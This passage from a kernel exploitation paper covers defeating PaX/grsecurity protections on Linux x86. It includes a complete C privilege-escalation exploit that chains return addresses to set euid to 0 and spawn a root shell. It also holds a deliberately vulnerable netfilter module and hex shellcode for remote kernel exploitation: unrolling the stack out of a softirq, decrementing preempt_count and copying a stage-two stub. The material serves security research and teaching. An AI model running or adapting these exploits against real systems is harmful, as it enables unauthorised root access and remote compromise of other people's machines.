At [1] the current process task_struct is taken from the kernel stack
value. At [2] the %ebx value is copied over the 'euid' and 'fsuid' members
of the struct. We have our return address, which is [1]. 
At that point we need to force somehow %ebx into being 0 (if we're not
lucky enough to have it already zero'ed).

To demonstrate this vulnerability we have used the local exploitable
buffer overflow in dummy.c driver (KERN_IOCTL_STORE_CHUNK ioctl()
command). Since it's a stack based overflow we can chain multiple return
address preparing a fake stack frame that we totally control. 
We need : 

 - a zero'ed %ebx : the easiest way to achieve that is to find a pop %ebx
   followed by a ret instruction [we control the stack] : 

	ret-to-pop-ebx:
		[*] c0100cd3:       5b      pop    %ebx
		[*] c0100cd4:       c3      ret
    
   we don't strictly need pop %ebx directly followed by ret, we may find a
   sequence of pops before the ret (and, among those, our pop %ebx). It is
   just a matter of preparing the right ZERO-layout for the pop sequence
   (to make it simple, add a ZERO 4-bytes sequence for any pop between the
   %ebx one and the ret)    

 - the return addr where to jump, which is the [1] address shown above

 - a 'ret-to-ret' padding to take care of the stack gap created at [3] by
   the function epilogue (%esp adding and register popping) :
	
	ret-to-ret pad:
		[*] 0xffffe413      c3      ret 

   (we could have used the above ret aswell, this one is into vsyscall
    page and was used in other exploit where we didn't need so much
    knowledge of the kernel .text.. it survived here :) )

 - the address of an iret instruction to return to userland (and a crafted
   stack frame for it, as we described above while discussing 'Stack
   Based' explotation) :

	ret-to-iret:
		[*] c013403f:       cf      iret


Putting all together this is how our 'stack' should look like to perform a
correct explotation :

low addresses
            +----------------+
            | ret-to-ret pad |
            | ret-to-ret pad |
            | .............. |
            | ret-to-pop ebx |
            | 0x00000000     |
            | ret-to-setuid  |
            | ret-to-ret pad |
            | ret-to-ret pad |
            | ret-to-ret pad |
            | .............  |
            | .............  |
            | ret-to-iret    |
            | fake-iret-frame|
            +----------------+
high addresses


Once correctly returned to userspace we have successfully modified 'fsuid'
and 'euid' value, but our 'ruid' is still the original one. At that point
we simply re-exec ourselves to get euid=0 and then spawn the shell. 
Code follows :

< stuff/expl/grsec_noexec.c >

#include <sys/ioctl.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>

#include "dummy.h"

#define DEVICE "/dev/dummy"
#define NOP 0x90
#define PAGE_SIZE 0x1000
#define STACK_SIZE 8192
//#define STACK_SIZE 4096


#define STACK_MASK ~(STACK_SIZE -1)
/* patch it at runtime */


#define ALTERNATE_STACK 0x00BBBBBB

/*2283d*/
#define RET_INTO_RET_STR   "\x3d\x28\x02\x00"
#define DUMMY              RET_INTO_RET_STR
#define ZERO               "\x00\x00\x00\x00"

/* 22ad3 */
#define RET_INTO_POP_EBX   "\xd3\x2a\x02\x00"
/* 1360 */
#define RET_INTO_IRET      "\x60\x13\x00\x00"
/* 227fc */
#define RET_INTO_SETUID    "\xfc\x27\x02\x00"

// do_eip at .text offset (rivedere)
// 0804864f
#define USER_CODE_OFFSET   "\x4f\x86\x04\x08"
#define USER_CODE_SEGMENT  "\x73\x00\x00\x00"
#define USER_EFLAGS        "\x46\x02\x00\x00"
#define USER_STACK_OFFSET  "\xbb\xbb\xbb\x00"
#define USER_STACK_SEGMENT "\x7b\x00\x00\x00"


/* sys_setuid - grsec kernel */
/*
   227fc:       89 e2                   mov    %esp,%edx
   227fe:       89 f1                   mov    %esi,%ecx
   22800:       81 e2 00 e0 ff ff       and    $0xffffe000,%edx
   22806:       8b 02                   mov    (%edx),%eax
   22808:       89 98 50 01 00 00       mov    %ebx,0x150(%eax)
   2280e:       89 98 58 01 00 00       mov    %ebx,0x158(%eax)
   22814:       8b 02                   mov    (%edx),%eax
   22816:       89 fa                   mov    %edi,%edx
   22818:       89 a8 54 01 00 00       mov    %ebp,0x154(%eax)
   2281e:       c7 44 24 18 01 00 00    movl   $0x1,0x18(%esp)
   22825:       00
   22826:       8b 04 24                mov    (%esp),%eax
   22829:       5d                      pop    %ebp
   2282a:       5b                      pop    %ebx
   2282b:       5e                      pop    %esi
   2282c:       5f                      pop    %edi
   2282d:       5d                      pop    %ebp
   2282e:       e9 ef d5 0c 00          jmp    efe22
<cap_task_post_setuid>
   22833:       83 ca ff                or     $0xffffffff,%edx
   22836:       89 d0                   mov    %edx,%eax
   22838:       5f                      pop    %edi
   22839:       5b                      pop    %ebx
   2283a:       5e                      pop    %esi
   2283b:       5f                      pop    %edi
   2283c:       5d                      pop    %ebp
   2283d:       c3                      ret

*/

/* pop %ebx, ret grsec
 *
 * ffd1a884:       5b                      pop    %ebx
 * ffd1a885:       c3                      ret
 */

char *g_prog_name;

char kern_noexec_shellcode[] =
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_POP_EBX
ZERO
RET_INTO_SETUID
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_POP_EBX
RET_INTO_POP_EBX
RET_INTO_POP_EBX
RET_INTO_POP_EBX
RET_INTO_POP_EBX
RET_INTO_POP_EBX
RET_INTO_POP_EBX
RET_INTO_POP_EBX
RET_INTO_RET_STR
RET_INTO_RET_STR
RET_INTO_IRET
USER_CODE_OFFSET
USER_CODE_SEGMENT
USER_EFLAGS
USER_STACK_OFFSET
USER_STACK_SEGMENT
;


void re_exec(int useless)
{
  char *a[3] = { g_prog_name, "exec", NULL };
  execve(g_prog_name, a, NULL);
}


char *allocate_jump_stack(unsigned int jump_addr, unsigned int size)
{
  unsigned int round_addr = jump_addr & 0xFFFFF000;
  unsigned int diff       = jump_addr - round_addr;
  unsigned int len        = (size + diff + 0xFFF) & 0xFFFFF000;
  char *map_addr = mmap((void*)round_addr,
                        len,
                        PROT_READ|PROT_WRITE,
                        MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE,
                        0,
                        0);

  if(map_addr == (char*)-1)
    return NULL;

  memset(map_addr, 0x00, len);

  return map_addr;
}


char *allocate_jump_code(unsigned int jump_addr, void* code, unsigned int
size)
{
  unsigned int round_addr = jump_addr & 0xFFFFF000;
  unsigned int diff       = jump_addr - round_addr;
  unsigned int len        = (size + diff + 0xFFF) & 0xFFFFF000;

  char *map_addr = mmap((void*)round_addr,
                        len,
                        PROT_READ|PROT_WRITE|PROT_EXEC,
                        MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS,
                        0,
                        0);

  if(map_addr == (char*)-1)
    return NULL;

  memset(map_addr, NOP, len);
  memcpy(map_addr+diff, code, size);

  return map_addr + diff;
}


inline void patch_code_4byte(char *code, unsigned int offset, unsigned int
value)
{
  *((unsigned int *)(code + offset)) = value;
}


int main(int argc, char *argv[])
{
  if(argc > 1)
  {
    int ret;
    char *argvx[] = {"/bin/sh", NULL};
    ret = setuid(0);
    printf("euid=%d, ret=%d\n", geteuid(), ret);
    execve("/bin/sh", argvx, NULL);
    exit(1);
  }

  signal(SIGSEGV, re_exec);

  g_prog_name = argv[0];
  char *stack_jump =
          allocate_jump_stack(ALTERNATE_STACK, PAGE_SIZE);

  if(!stack_jump)
  {
    fprintf(stderr, "Exiting: mmap failed");
    exit(1);
  }



  char *memory = malloc(PAGE_SIZE), *mem_orig;
  mem_orig = memory;

  memset(memory, 0xDD, PAGE_SIZE);


  struct device_io_ctl *ptr = (struct device_io_ctl*)memory;
  ptr->chunk_num = 9 + (sizeof(kern_noexec_shellcode)-1)/sizeof(struct
device_io_blk) + 1;
  printf("Chunk num: %d\n", ptr->chunk_num);
  ptr->type = 0xFFFFFFFF;

  memory += (sizeof(struct device_io_ctl) + sizeof(struct device_io_blk) *
9);

  /* copy shellcode */
  memcpy(memory, kern_noexec_shellcode, sizeof(kern_noexec_shellcode)-1);

  int i, fd = open(DEVICE,  O_RDONLY);
  if(fd < 0)
    return 0;

  ioctl(fd, KERN_IOCTL_STORE_CHUNK, (unsigned long)mem_orig);
  return 0;
}

< / >


As we said, we have chosen the PaX security patches for Linux/x86, but
some of the theory presented equally works well in other situation. 
A slightly different exploiting approach was successfully used on
Solaris/SPARC. (we leave it as an 'exercise' for the reader ;)) 

  
---[ 3.2 - Remote Kernel Exploiting 


Writing a working and somehow reliable remote kernel exploit is an
exciting and interesting challenge. Keeping on with the 'style' of this
paper we're going to propose here a couple of tecniques and 'life notes'
that leaded us into succeeding into writing an almost reliable, image
independant and effective remote exploit.

After the first draft of this paper, a couple of things changed, so some
of the information presented here could be outdated in the very latest
kernels (and compiler releases), but are anyway a good base for the
tractation (we've added notes all around this chapter about changes and
updates into the recent releases of the linux kernel).

A couple of the ideas presented here converged into a real remote exploit
for the madwifi remote kernel stack buffer overflow [21], that we already
released [22], without examining too much in detail the explotation
approaches used. This chapter can be thus seen both as the introduction
and the extension of that work. 
More precisely we will cover here also the exploiting issues and solution
when dealing with code running in interrupt context, which is the most
common running mode for network based code (interrupt handler, softirq,
etc) but which wasn't the case for the madwifi exploit.
The same ideas apply well to kernel thread context too.

Explotation tecniques and discussion is based on stack based buffer
overflow on the Linux 2.6.* branch of kernels on the x86 architecture, but
can be reused in most of the conditions that lead us to take control over 
the instruction flow.


------[ 3.2.1 - The Network Contest 


We begin with a few considerations about the typology of kernel code that 
we'll be dealing with. Most of that code runs in interrupt context (and
sometimes in a kernel thread context), so we have some 'limitations' :

  - we can't directly 'return-to-userspace', since we don't have a valid 
    current task pointer. Moreover, most of times, we won't control the
    address space of the userland process we talk with. Netherless we can
    relay on some 'fixed' points, like the ELF header (given there's no
    PIE / .text randomization on the remote box)

  - we can't perform any action that might make the kernel path to sleep
    (for example a memory fault access)

  - we can't directly call a system call 
 
  - we have to take in account kernel resource management, since such kind
    of kernel paths usually acquire spinlocks or disables pre-emption. We
    have to restore them in a stable state.

Logically, since we are from remote, we don't have any information about
structs or kernel paths addresses, so, since a good infoleaking is usually
a not very probable situation, we can't rely on them. 

We have prepared a crafted example that will let us introduce all the
tecniques involved to solve the just stated problems. We choosed to write
a netfilter module, since quite a lot of the network kernel code depends
on it and it's the main framework for third part modules. 

< stuff/drivers/linux/remote/dummy_remote.c >

#define MAX_TWSKCHUNK 30
#define TWSK_PROTO    37

struct twsk_chunk
{
  int type;
  char buff[12];
};

struct twsk
{
  int chunk_num;
  struct twsk_chunk chunk[0];
};


static int process_twsk_chunk(struct sk_buff *buff)
{
  struct twsk_chunk chunks[MAX_TWSKCHUNK];

  struct twsk *ts = (struct twsk *)((char*)buff->nh.iph +
(buff->nh.iph->ihl * 4));

  if(ts->chunk_num > MAX_TWSKCHUNK)                                   [1]                               
    return (NF_DROP);

  printk(KERN_INFO "Processing TWSK packet: packet frame n. %d\n",
ts->chunk_num);

memcpy(chunks, ts->chunk, sizeof(struct twsk_chunk) * ts->chunk_num); [2] 

  // do somethings..

  return (NF_ACCEPT);

}

< / >


We have a signedness issue at [1], which triggers a later buffer overflow
at [2], writing past the local 'chunks' buffer. 
As we just said, we must know everything about the vulnerable function,
that is, when it runs, under which 'context' it runs, what calls what, how
would the stack look like, if there are spinlocks or other control 
management objects acquired, etc.

A good starting point is dumping a stack trace at calling time of our
function :

#1  0xc02b5139 in nf_iterate (head=0xc042e4a0, skb=0xc1721ad0, hook=0, [1]
    indev=0xc1224400, outdev=0x0, i=0xc1721a88,
    okfn=0xc02bb150 <ip_rcv_finish>, hook_thresh=-2147483648)
    at net/netfilter/core.c:89
#2  0xc02b51b9 in nf_hook_slow (pf=2, hook=1, pskb=0xc1721ad0,         [2] 
    indev=0xc1224400, outdev=0x0, okfn=0xc02bb150 <ip_rcv_finish>,
    hook_thresh=-2147483648) at net/netfilter/core.c:125
#3  0xc02baee3 in ip_rcv (skb=0xc1bc4a40, dev=0xc1224400, pt=0xc0399310,
    orig_dev=0xc1224400) at net/ipv4/ip_input.c:348
#4  0xc02a5432 in netif_receive_skb (skb=0xc1bc4a40) at
net/core/dev.c:1657
#5  0xc024d3c2 in rtl8139_rx (dev=0xc1224400, tp=0xc1224660, budget=64)
    at drivers/net/8139too.c:2030
#6  0xc024d70e in rtl8139_poll (dev=0xc1224400, budget=0xc1721b78)
    at drivers/net/8139too.c:2120
#7  0xc02a5633 in net_rx_action (h=0xc0417078) at net/core/dev.c:1739
#8  0xc0118a75 in __do_softirq () at kernel/softirq.c:95
#9  0xc0118aba in do_softirq () at kernel/softirq.c:129                [3]
#10 0xc0118b7d in irq_exit () at kernel/softirq.c:169
#11 0xc0104212 in do_IRQ (regs=0xc1721ad0) at arch/i386/kernel/irq.c:110
#12 0xc0102b0a in common_interrupt () at current.h:9
#13 0x0000110b in ?? ()
 
Our vulnerable function (just like any other hook) is called serially by
the nf_iterate one [1], during the processing of a softirq [3], through
the netfilter core interface nf_hook_slow [2]. 
It is installed in the INPUT chain and, thus, it starts processing packets
whenever they are sent to the host box, as we see from [2] where pf = 2
(PF_INET) and hook = 1 (NF_IP_LOCAL_IN). 

Our final goal is to execute some kind of code that will estabilish a
connection back to us (or bind a port to a shell, or whatever kind of
shellcoding you like more for your remote exploit). Trying to execute it
directly from kernel land is obviously a painful idea so we need to hijack
some userland process (remember that we are on top of a softirq, so we
have no clue about what's really beneath us; it could equally be a kernel
thread or the idle task, for example) as our victim, to inject some code
inside and force the kernel to call it later on, when we're out of an
asyncronous event.

That means that we need an intermediary step between taking the control
over the flow at 'softirq time' and execute from the userland process. 
But let's go on order, first of all we need to _start executing_ at least
the entry point of our shellcode. 

As it is nowadays used in many exploit that have to fight against address
space randomization in the absence of infoleaks, we look for a jump to a 
jmp *%esp or push reg/ret or call reg sequence, to start executing from a
known point.
To avoid guessing the right return value a nop-alike padding of
ret-into-ret addresses can be used. But we still need to find those
opcodes in a 'fixed' and known place.

The 2.6. branch of kernel introduced a fixed page [*] for the support of
the 'sysenter' instruction, the 'vsyscall' one :

bfe37000-bfe4d000 rwxp bfe37000 00:00 0          [stack]
ffffe000-fffff000 ---p 00000000 00:00 0          [vdso]

which is located at a fixed address : 0xffffe000 - 0xfffff000. 

[*] At time of release this is no more true on latest kernels, since the
    address of the vsyscall page is randomized starting from the 2.6.18 
    kernel. 
 
The 'vsyscall' page is a godsend for our 'entry point' shellcode, since we
can locate inside it the required opcodes [*] to start executing : 

(gdb) x/i 0xffffe75f
0xffffe75f:     jmp    *%esp
(gdb) x/i 0xffffe420
0xffffe420:     ret

[*] After testing on a wide range of kernels/compilers the addresses of 
    those opcodes we discovered that sometimes they were not in the
    expected place or, even, in one case, not present. This could be the
    only guessing part you could be facing (also due to vsyscall
    randomization, as we said in the note before), but there are
    (depending on situations) other possibilities [fixed start of the
    kernel image, fixed .text of the 'running process' if out of interrupt 
    context, etc].

To better figure out how the layout of the stack should be after the
overflow, here there's a small schema :

+-------------+
|             |
|             |
| JMP -N      |-------+     # N is the size of the buffer plus some bytes
|             |       |       (ret-to-ret chain + jmp space)
|             |       |
| ret-to-jmp  |<-+    |     # the address of the jmp *%esp inside vsyscall
|             |  |    |
| .........   | -+    |
|             |  |    |
| ret-to-ret  | -+    |     # the address of 'ret' inide vsyscall 
|             |  |    |
| ret-to-ret  | -+    |
|             |       |
| overwritten |       |     # ret-to-ret padding starting from there
| ret address |       |
|             |       |
|             |       |
|      ^      |       |
|      |      |       |     # shellcode is placed inside the buffer
|             |       |       because it's huge, but it could also be
|  shellcode  |       |       splitted before and after the ret addr.
|   nop       |       |
|   nop       |<------+
+-------------+
 
    
At that point we control the flow, but we're still inside the softirq, so
we need to perform a couple of tasks to cleanly get our connect back
shellcode executed :

  - find a way to cleanly get out from the softirq, since we trashed the 
    stack 
  - locate the resource management objects that have been modified (if
    the've been) and restore them to a safe state
  - find a place where we can store our shellcode untill later execution 
    from a 'process context' kernel path.
  - find a way to force the before mentioned kernel path to execute our
    shellcode

The first step is the most difficult one (and wasn't necessary in the
madwifi exploit, since we weren't in interrupt context), because we've
overwritten the original return pointer and we have no clue about the
kernel text layout and addresses.

We're going now to present tecniques and a working shellcode for each one
of the above points. [ Note that we have mentioned them in a 'conceptual
order of importance', which is different from the real order that we use
inside the exploit. More precisely, they are almost in reverse order,
since the last step performed by our shellcode is effectively getting out
from the softirq. We felt that approach more well-explanatory, just
remember that note during the following sub-chapters] 


------[ 3.2.2 - Stack Frame Flow Recovery   

 
The goal of this tecnique is to unroll the stack, looking for some known
pattern and trying to reconstruct a caller stack frame, register status
and instruction pointing, just to continue over with the normal flow. 
We need to restore the stack pointer to a known and consistent state,
restore register contents so that the function flow will exit cleanily and
restore any lock or other syncronization object that was modified by the
functions among the one we overflowed in and the one we want to 'return
to'. 

Our stack layout (as seen from the dump pasted above) would basically be
that one :

stack layout
+---------------------+   bottom of stack
|                     |
| do_softirq()        |
| ..........          |             /* nf_hook_slow() stack frame */
| ..........          |             +------------------------+
|                     |             |  argN                  |
|                     |             |  ...                   |
| ip_rcv              |             |  arg2                  |
| nf_hook_slow        | =========>  |  arg1                  |
| ip_rcv_finish       |             |  ret-to-(ip_rcv())     |
| nf_iterate          |             |  saved reg1            |
|                     |             |  saved reg2            |
|                     |             |  ......                |
| ..............      |             +------------------------+
| ..............      |
| process_twsk_chunk  |
|                     |
+---------------------+  top of stack


As we said, we need to locate a function in the previous stack frames, not
too far from our overflowing one, having some 'good pattern' that would
help us in our search.
Our best bet, in that situation, is to check parameter passing : 

#2  0xc02b51b9 in nf_hook_slow (pf=2, hook=1, pskb=0xc1721ad0,
indev=0xc1224400, outdev=0x0, ....)

The 'nf_hook_slow()' function has a good 'signature' :              

  -  two consecutive dwords 0x00000002 and 0x00000002
  -  two kernel pointers (dword > 0xC0000000)
  -  a following NULL dword

We can relay on the fact that this pattern would be a constant, since
we're in the INPUT chain, processing incoming packets, and thus always
having a NULL 'outdev', pf = 2 and hook = 1.
Parameters passing is logically not the only 'signature' possible :
depending on situations you could find a common pattern in some local
variable (which would be even a better one, because we discovered that
some versions of GCC optimize out some parameters, passing them through
registers). 

Scanning backward the stack from the process_twsk_chunk() frame up to
the nf_hook_slow() one, we can later set the %esp value to the place where 
is saved the return address of nf_hook_slow(), and, once recreated the 
correct conditions, perform a 'ret' that would let us exit cleanily.
We said 'once recreated the correct conditions' because the function could
expect some values inside registers (that we have to set) and could expect
some 'lock' or 'preemption set' different from the one we had at time of
overflowing. Our task is thus to emulate/restore all those requirements.

To achieve that, we can start checking how gcc restores registers during
function epilogue :

c02b6b30 <nf_hook_slow>:
c02b6b30:       55                      push   %ebp
c02b6b31:       57                      push   %edi
c02b6b32:       56                      push   %esi
c02b6b33:       53                      push   %ebx
[...]
c02b6bdb:       89 d8                   mov    %ebx,%eax
c02b6bdd:       5a                      pop    %edx       ==+
c02b6bde:       5b                      pop    %ebx         |
c02b6bdf:       5e                      pop    %esi         | restore
c02b6be0:       5f                      pop    %edi         |
c02b6be1:       5d                      pop    %ebp        =+
c02b6be2:       c3                      ret

This kind of epilogue, which is common for non-short functions let us
recover the state of the saved register. Once we have found the 'ret'
value on the stack we can start 'rolling back' counting how many 'pop' are
there inside the text to correctly restore those register. [*]

[*] This is logically not the only possibility, one could set directly the
    values via movl, but sometimes you can't use 'predefined' values for
    those register. As a side note, some versions of the gcc compiler
    don't use the push/pop prologue/epilogue, but translate the code as a
    sequence of movl (which need a different handling from the shellcode).      
 
To correctly do the 'unrolling' (and thus locate the pop sequence), we
need the kernel address of 'nf_hook_slow()'. This one is not hard to
calculate since we have already found on the stack its return addr (thanks
to the signature pointed out before). Once again is the intel calling
procedures convention which help us :

[...]
c02bc8bd:       6a 02                   push   $0x2
c02bc8bf:       e8 6c a2 ff ff          call   c02b6b30 <nf_hook_slow>
c02bc8c4:       83 c4 1c                add    $0x1c,%esp
[...]

That small snippet of code is taken from ip_rcv(), which is the function
calling nf_hook_slow(). We have found on the stack the return address,
which is 0xc02bc8c4, so calculating the nf_hook_slow address is just a
matter of calculating the 'displacement' used in the relative call (opcode
0xe8, the standard calling convention on kernel gcc-compiled code) and
adding it to the return addr value (INTEL relative call convention adds
the displacement to the current EIP) : 

[*] call to nf_hook_slow -> 0xe8 0x6c 0x2a 0xff 0xff 
[*] nf_hook_slow address -> 0xc02bc8c4 + 0xffffa26c = 0xc02b6b30 

To better understand the whole Stack Frame Flow Recovery approach here's
the shellcode stub doing it, with short comments :

 - Here we increment the stack pointer with the 'pop %eax' sequence and
   test for the known signature [ 0x2 0x1 X X 0x0 ].

loop:
"\x58"                  // pop    %eax
"\x83\x3c\x24\x02"      // cmpl   $0x2,(%esp)
"\x75\xf9"              // jne    loop
"\x83\x7c\x24\x04\x01"  // cmpl   $0x1,0x4(%esp)
"\x75\xf2"              // jne    loop
"\x83\x7c\x24\x10\x00"  // cmpl   $0x0,0x10(%esp)
"\x75\xeb"              // jne    loop
"\x8d\x64\x24\xfc"      // lea    0xfffffffc(%esp),%esp
  
 - get the return address, subtract 4 bytes and deference the pointer to get
   the nf_hook_slow() offset/displacement. Add it to the return address to
   obtain the nf_hook_slow() address. 

"\x8b\x04\x24"          // mov    (%esp),%eax
"\x89\xc3"              // mov    %eax,%ebx
"\x03\x43\xfc"          // add    0xfffffffc(%ebx),%eax

 - locate the 0xc3 opcode inside nf_hook_slow(), eliminating 'spurious'
   0xc3 bytes. In this shellcode we do a simple check for 'movl' opcodes
   and that's enough to avoid 'false positive'. With a larger shellcode
   one could write a small disassembly routine that would let perform a
   more precise locating of the 'ret' and 'pop' [see later]. 

increment:
"\x40"                  // inc    %eax
"\x8a\x18"              // mov    (%eax),%bl
"\x80\xfb\xc3"          // cmp    $0xc3,%bl
"\x75\xf8"              // jne    increment
"\x80\x78\xff\x88"      // cmpb   $0x88,0xffffffff(%eax)
"\x74\xf2"              // je     increment
"\x80\x78\xff\x89"      // cmpb   $0x89,0xffffffff(%eax)
"\x74\xec"              // je     8048351 increment

 - roll back from the located 'ret' up to the last pop instruction, if 
   any and count the number of 'pop's.  
  
pop:
"\x31\xc9"              // xor    %ecx,%ecx
"\x48"                  // dec    %eax
"\x8a\x18"              // mov    (%eax),%bl
"\x80\xe3\xf0"          // and    $0xf0,%bl
"\x80\xfb\x50"          // cmp    $0x50,%bl
"\x75\x03"              // jne    end
"\x41"                  // inc    %ecx
"\xeb\xf2"              // jmp    pop
"\x40"                  // inc    %eax

 - use the calculated byte displacement from ret to rollback %esp value

"\x89\xc6"              // mov    %eax,%esi
"\x31\xc0"              // xor    %eax,%eax
"\xb0\x04"              // mov    $0x4,%al
"\xf7\xe1"              // mul    %ecx
"\x29\xc4"              // sub    %eax,%esp

 - set the return value 

"\x31\xc0"              // xor    %eax,%eax

 - call the nf_hook_slow() function epilog
 
"\xff\xe6"              // jmp    *%esi


It is now time to pass to the 'second step', that is restore any pending
lock or other synchronization object to a consistent state for the
nf_hook_slow() function. 


---[ 3.2.3 - Resource Restoring 


At that phase we care of restoring those resources that are necessary for
the 'hooked return function' (and its callers) to cleanly get out from the
softirq/interrupt state. 

Let's take another (closer) look at nf_hook_slow() : 

< linux-2.6.15/net/netfilter/core.c >

int nf_hook_slow(int pf, unsigned int hook, struct sk_buff **pskb,
                 struct net_device *indev,
                 struct net_device *outdev,
                 int (*okfn)(struct sk_buff *),
                 int hook_thresh)
{
        struct list_head *elem;
        unsigned int verdict;
        int ret = 0;

        /* We may already have this, but read-locks nest anyway */
        rcu_read_lock();		[1]

[...]
 
unlock:
        rcu_read_unlock();		[2]
        return ret;			[3]
}

< / >

At [1] 'rcu_read_lock()' is invoked/acquired, but [2] 'rcu_read_unlock()'
is never performed, since at the 'Stack Frame Flow Recovery' step we
unrolled the stack and jumped back at [3]. 

'rcu_read_unlock()' is just an alias of preempt_enable(), which, in the 
end, results in a one-decrement of the preempt_count value inside the
thread_info struct :

< linux-2.6.15/include/linux/rcupdate.h >

#define rcu_read_lock()         preempt_disable()

[...]

#define rcu_read_unlock()       preempt_enable()

< / >

< linux-2.6.15/include/linux/preempt.h >

# define add_preempt_count(val) do { preempt_count() += (val); } while (0)
# define sub_preempt_count(val) do { preempt_count() -= (val); } while (0)

[...]

#define inc_preempt_count() add_preempt_count(1)
#define dec_preempt_count() sub_preempt_count(1)

#define preempt_count() (current_thread_info()->preempt_count)

#ifdef CONFIG_PREEMPT

asmlinkage void preempt_schedule(void);

#define preempt_disable() \
do { \
        inc_preempt_count(); \
        barrier(); \
} while (0)

#define preempt_enable_no_resched() \
do { \
        barrier(); \
        dec_preempt_count(); \
} while (0)

#define preempt_check_resched() \
do { \
        if (unlikely(test_thread_flag(TIF_NEED_RESCHED))) \
                preempt_schedule(); \
} while (0)

#define preempt_enable() \
do { \
        preempt_enable_no_resched(); \
        barrier(); \
        preempt_check_resched(); \
} while (0)

#else

#define preempt_disable()               do { } while (0)
#define preempt_enable_no_resched()     do { } while (0)
#define preempt_enable()                do { } while (0)
#define preempt_check_resched()         do { } while (0)

#endif
     
< / >   

As you can see, if CONFIG_PREEMPT is not set, all those operations are 
just no-ops. 'preempt_disable()' is nestable, so it can be called multiple
times (preemption will be disabled untill we call 'preempt_enable()' the 
same number of times). That means that, given a PREEMPT kernel, we should
find a value equal or greater to '1' inside preempt_count at 'exploit
time'. We can't just ignore that value or otherwise we'll BUG() later on
inside scheduler code (check preempt_schedule_irq() in kernel/sched.c). 

What we have to do, on a PREEMPT kernel, is thus locate 'preempt_count'
and decrement it, just like 'rcu_read_unlock()' would do. 
For the x86 architecture , 'preempt_count' is stored inside the 'struct 
thread_info' : 

< linux-2.6.15/include/asm-i386/thread_info.h >

struct thread_info {
        struct task_struct      *task;          /* main task structure */
        struct exec_domain      *exec_domain;   /* execution domain */
        unsigned long           flags;          /* low level flags */
        unsigned long           status;         /* thread-synchronous
flags */
        __u32                   cpu;            /* current CPU */
        int                     preempt_count;  /* 0 => preemptable, <0 =>
BUG */


        mm_segment_t            addr_limit;     /* thread address space:
                                                   0-0xBFFFFFFF for
user-thead
                                                   0-0xFFFFFFFF for
kernel-thread
                                                */
 
[...]

< / >

Let's see how we get to it : 

 - locate the thread_struct 

"\x89\xe0"                 // mov %esp,%eax
"\x25\x00\xe0\xff\xff"     // and $0xffffe000,%eax

 - scan the thread_struct to locate the addr_limit value. This value is a
   good fingerprint, since it is 0xc0000000 for an userland process and  
   0xffffffff for a kernel thread (or the idle task). [note that this kind 
   of scan can be used to figure out in which kind of process we are, 
   something that could be very important in some scenario] 

/* scan: */
"\x83\xc0\x04"             // add $0x4,%eax
"\x8b\x18"                 // mov (%eax),%ebx
"\x83\xfb\xff"             // cmp $0xffffffff,%ebx
"\x74\x0a"                 // je 804851e <end>
"\x81\xfb\x00\x00\x00\xc0" // cmp $0xc0000000,%ebx
"\x74\x02"                 // je 804851e <end>
"\xeb\xec"                 // jmp 804850a <scan>

 - decrement the 'preempt_count' value [which is just the member above the
   addr_limit one] 

/* end: */
"\xff\x48\xfc"             // decl 0xfffffffc(%eax)
 

To improve further the shellcode it would be a good idea to perform a test
over the preempt_count value, so that we would not end up into lowering it
below zero. 


---[ 3.2.4 - Copying the Stub 

 
We have just finished presenting a generic method to restore the stack
after a 'general mess-up' of the netfilter core call-frames. 
What we have to do now is to find some place to store our shellcode, since
we can't (as we said before) directly execute from inside interrupt
context. [remember the note, this step and the following one are executed
before getting out from the softirq context]. 

Since we don't know almost anything about the remote kernel image memory
mapping we need to find a 'safe place' to store the shellcode, that is, we
need to locate some memory region that we can for sure reference and that
won't create problems (read : Oops) if overwritten. 

There are two places where we can copy our 'stage-2' shellcode :

  - IDT (Interrupt Descriptor Table) : we can easily get the IDT logical
    address at runtime (as we saw previously in the NULL dereference
    example) and Linux uses only the 0x80 software interrupt vector : 

    +-----------------+
    | exeption        |
    |    entries      |
    |-----------------|
    |  hw interrupt   |
    |      entries    |
    |-----------------| entry #32 ==+
    |                 |             |
    |  soft interrupt |             |
    |      entries    |             | usable gap
    |                 |             |
    |                 |             |
    |                 |           ==+
    |  int 0x80       | entry #128
    |                 |
    +-----------------+ <- offset limit
 
    Between entry #32 and entry #128 we have all unused descriptor
    entries, each 8 bytes long. Linux nowadays doesn't map that memory
    area as read-only [as it should be], so we can write on it [*]. 	
    We have thus : (128 - 32) * 8 = 98 * 8 = 784 bytes, which is enough 
    for our 'stage-2 shellcode'. 

    [*] starting with the Linux kernel 2.6.20 it is possible to map some
        areas as read-only [the idt is just one of those]. Since we don't
        'start' writing into the IDT area and executing from there, it is
        possible to bypass that protection simply modifying directly
        kernel page tables protection in 'previous stages' of the
        shellcode.

  - the current kernel stack : we need to make a little assumption here,
    that is being inside a process that would last for some time (untill
    we'll be able to redirect kernel code over our shellcode, as we will
    see in the next section). 
    Usually the stack doesn't grow up to 4kb, so we have an almost free 
    4kb page for us (given that the remote system is using an 8kb stack
    space). To be safe, we can leave some pad space before the shellcode. 
    We need to take care of the 'struct thread_struct' saved at the
    'bottom' of the kernel stack (and that logically we don't want to
    overwrite ;) ) :

    +-----------------+
    | thread_struct   |
    |---------------- |  ==+
    |                 |    | usable gap
    |                 |    |
    |-----------------|  ==+
    |                 |
    |       ^         |
    |       |         |  [ normally the stack doesn't ]
    |       |         |  [ grow over 4kb              ]
    |                 |
    |  ring0 stack    |
    +-----------------+
    
    Alltogether we have : (8192 - 4096) - sizeof(descriptor) - pad ~= 2048
    bytes, which is even more than before. 
    With a more complex shellcode we can traverse the process table and
    look forward for a 'safe process' (init, some kernel thread, some main
    server process). 

Let's give a look to the shellcode performing that task : 

 - get the stack address where we are [the uber-famous call/pop trick]

"\xe8\x00\x00\x00\x00"         //  call   51 <search+0x29>
"\x59"                         //  pop    %ecx
 
